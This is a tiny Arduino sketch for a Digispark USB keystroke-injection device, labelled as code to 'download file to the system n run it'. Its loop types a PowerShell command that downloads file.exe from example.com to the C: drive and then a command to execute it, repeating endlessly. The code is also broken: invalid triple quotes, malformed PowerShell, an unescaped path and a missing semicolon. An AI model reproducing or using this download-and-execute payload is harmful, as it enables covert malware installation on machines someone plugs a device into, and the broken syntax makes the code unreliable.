//copyleft - this code is in the public domain
#include <DigiKeyboard.h>

//download file to the system n run it

void setup(){

}

void loop(){
  DigiKeyboard.println('''powershell $New-Object System.Net.WebClient.DownloadFile("http://example.com/file.exe","C:\file.exe") ''')
  DigiKeyboard.println("cmd C:\file.exe")
  delay(1500)
}

